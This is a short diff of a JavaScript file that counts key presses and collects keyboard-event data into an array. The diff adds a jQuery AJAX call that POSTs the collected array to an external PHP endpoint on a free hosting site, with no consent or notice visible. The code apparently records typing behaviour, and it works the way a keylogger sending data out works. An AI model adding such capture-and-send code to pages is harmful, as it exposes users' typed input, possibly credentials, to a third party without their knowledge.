@@ -7,6 +7,7 @@ var t_down = 0;
 var ar = [];
 var ar1 = {};
 
+
 window.addEventListener("keydown", event => {
     c_down = c_down + 1;
   if (ar.length == 0){
@@ -38,9 +39,16 @@ window.addEventListener("keyup", event => {
         c_up = 0;
       c_down = 0;
       document.getElementById('test1').innerHTML = ar;
+      $.ajax({
+        url: "https://palexandrov.000webhostapp.com/public_html/index.php",
+        type: "POST",
+        data: {array: ar}
+      });
      }
   }
 });
+
+
 
 
 
